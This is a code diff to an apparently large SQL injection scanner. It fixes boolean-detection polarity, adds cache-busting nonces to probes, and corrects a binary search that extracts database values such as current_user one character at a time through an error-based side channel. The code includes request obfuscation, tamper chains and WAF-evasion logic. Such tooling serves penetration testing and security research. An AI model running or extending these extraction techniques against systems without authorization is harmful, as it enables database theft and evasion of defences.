@@ -39151,7 +39151,17 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                         _ts_bw = _sim_to_baseline(_fp_bw_t, baseline)
                         _fs_bw = _sim_to_baseline(_fp_bw_f, baseline)
                         _delta_bw = _ts_bw - _fs_bw
-                        if _ts_bw > 0.78 and _delta_bw > 0.22 and _fs_bw < (_ts_bw - 0.18):
+                        # BUG-BOOL-XCAT-REVERSED-POLARITY FIX (HIGH): the original guard
+                        # only tested normal polarity (TRUE resp ≈ baseline, delta > 0).
+                        # On stub/empty-baseline targets the polarity is inverted: the
+                        # FALSE-condition probe returns the full page (high SimHash vs
+                        # baseline) while the TRUE probe returns a short/empty response
+                        # (low SimHash).  _delta_bw is then negative and the injection
+                        # was silently skipped.  Fix: accept either polarity; the sign of
+                        # _delta_bw determines which confirmation threshold to apply.
+                        _bw_true_hi = _ts_bw > 0.78 and _delta_bw > 0.22 and _fs_bw < (_ts_bw - 0.18)
+                        _bw_false_hi = _fs_bw > 0.78 and (-_delta_bw) > 0.22 and _ts_bw < (_fs_bw - 0.18)
+                        if _bw_true_hi or _bw_false_hi:
                             # Confirmation probe to eliminate dynamic-page noise
                             if _SCAN_STOPPED[0]:  # BUG-A-FIX [Req 4]: stop before extra probe
                                 return None
@@ -39166,7 +39176,8 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                                     WAFBlockDiscriminator.is_waf_block(_fp_bw_cf)):
                                 _c_delta_bw = (_sim_to_baseline(_fp_bw_c, baseline) -
                                                _sim_to_baseline(_fp_bw_cf, baseline))
-                                if _c_delta_bw > 0.20:
+                                # Accept confirmation under whichever polarity was detected
+                                if (_bw_true_hi and _c_delta_bw > 0.20) or (_bw_false_hi and _c_delta_bw < -0.20):
                                     # PCV-FIX-1/2/3 (cross-cat FULL path): same FP guards
                                     try:
                                         _bwfg_ok, _bwfg_c = await _run_fp_guards_boolean(
@@ -132689,7 +132700,7 @@ class SideChannelExtractor:
                 return f"$${val}$$"
             return f"$q${val}$q$"
 
-    async def _send(self, payload):
+    async def _send(self, payload, extra_qs=None):
         """Send payload through injection point with tamper chain.
 
         BUG-SCE-SEND-MISSING-LIGHT-VARY FIX (HIGH, all 5 DBMSes, all S/DS/T/TH
@@ -132744,8 +132755,17 @@ class SideChannelExtractor:
                 self.original + payload, self._req_count, data_fmt=self.data_fmt)
             _sce_full = _obfuscate_extraction_cond(_sce_full, self._req_count)
             _sce_full = apply_sql_noise(_sce_full, self._req_count)
+            # BUG-SCE-REVALIDATION-CDN-CACHE FIX: extra_qs allows callers to append a
+            # unique _smvnonce to the URL so CDN-cached responses do not collapse the
+            # true vs. false probe pair into one identical cached body/status code.
+            # This is needed for probe_where_error real-validation probes (fp3/fp4)
+            # where CDN caching of POST responses would cause both to return the same
+            # cached response → length/status identical → strategy incorrectly rejected.
+            _sce_url = self.url
+            if extra_qs:
+                _sce_url = _sce_url + ("&" if "?" in _sce_url else "?") + extra_qs
             return await _send_injected(
-                self.engine, self.method, self.url, self.data,
+                self.engine, self.method, _sce_url, self.data,
                 self.data_fmt, self.param,
                 _sce_full,
                 self.tc)
@@ -132996,10 +133016,17 @@ class SideChannelExtractor:
             _real_t, _real_f = self._build_error_cond(_sname,
                 f"current_user>={_qval_lo}", f"current_user>={_qval_hi}")
             if _real_t and _real_f:
-                fp3 = await self._send(_real_t)
+                # BUG-SCE-REVALIDATION-CDN-CACHE FIX: add unique _smvnonce to each
+                # real-validation probe so CDN-cached POST responses do not make fp3
+                # and fp4 return identical status/length → strategy correctly rejected
+                # only when the oracle genuinely has no signal, not due to CDN collapsing
+                # both probes into the same cached response.
+                _rv_nonce3 = random.randint(100000, 999999)
+                fp3 = await self._send(_real_t, extra_qs=f"_smvnonce={_rv_nonce3}")
                 if _SCAN_STOPPED[0]: return None  # BUG-FIX-REQ4-SLEEP
                 await asyncio.sleep(1.0)
-                fp4 = await self._send(_real_f)
+                _rv_nonce4 = random.randint(100000, 999999)
+                fp4 = await self._send(_real_f, extra_qs=f"_smvnonce={_rv_nonce4}")
 
                 s3 = getattr(fp3, "status_code", None) if fp3 else None
                 s4 = getattr(fp4, "status_code", None) if fp4 else None
@@ -133297,8 +133324,21 @@ class SideChannelExtractor:
                 _above_z = await self.eval_where_error(
                     f"{expr}{_cmp}{self._quote_val(prefix + chr(ord('z') + 1))}")
                 await asyncio.sleep(0.2)
-                if _above_z is None or not _above_z:
-                    lo, hi = ord('a'), ord('z')       # definitely lowercase a-z
+                # BUG-SCE-WE-ABOVEZ-NONE FIX (HIGH): the original `if _above_z is None
+                # or not _above_z` treated a None (oracle-dead / CDN-blocked probe)
+                # identically to False (char is confirmed in [97,122]).  When CDN blocks
+                # the coarse-narrowing probe and returns None, the binary search is
+                # wrongly confined to [ord('a'), ord('z')] = [97,122].  Characters in
+                # [123, _sce_we_char_hi] ('{', '|', '}', Latin-1 128-255, Unicode BMP)
+                # converge to chr(122)='z' — a wrong but plausible-looking character.
+                # Fix: handle None and False separately.  When _above_z is None (probe
+                # failed), keep the wider range [97, _sce_we_char_hi] so the binary
+                # search can still converge correctly.  Only narrow to [97,122] when the
+                # probe CONFIRMS the character is not above chr(122)='z' (i.e., False).
+                if _above_z is None:
+                    lo, hi = ord('a'), _sce_we_char_hi  # probe failed; keep full upper range
+                elif not _above_z:
+                    lo, hi = ord('a'), ord('z')       # confirmed: char is in lowercase a-z
                 else:
                     lo, hi = ord('z') + 1, _sce_we_char_hi  # above lowercase: {|}~, Latin-1 128-255, Unicode BMP/full
             else:
@@ -133306,6 +133346,13 @@ class SideChannelExtractor:
                 lo, hi = 32, ord('a') - 1
 
             # Binary search within narrowed range
+            # BUG-SCE-WE-BSEARCH-UNCONVERGED FIX (HIGH): when the oracle returns None
+            # twice mid-search, the old code did `break` with `lo` at an intermediate
+            # unconverged value, then `ch = chr(lo)` yielded garbage Unicode codepoints
+            # (observed as U+BFBE1, U+4B7C1 in real extraction logs at positions 2 and
+            # 5 of current_user).  Fix: track convergence with a flag; skip the char
+            # when the search was interrupted before lo==hi.
+            _bsearch_converged = True
             while lo < hi:
                 # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
                 # Fixed pivot in error-based prefix binary search.
@@ -133318,6 +133365,7 @@ class SideChannelExtractor:
                     await asyncio.sleep(2.0)
                     result = await self.eval_where_error(cond)
                 if result is None:
+                    _bsearch_converged = False  # lo is not reliable; do not emit chr(lo)
                     break
                 if result:
                     lo = mid + 1
@@ -133325,7 +133373,7 @@ class SideChannelExtractor:
                     hi = mid
                 await asyncio.sleep(0.3)
 
-            if lo < 32:
+            if lo < 32 or not _bsearch_converged:
                 break
 
             ch = chr(lo)
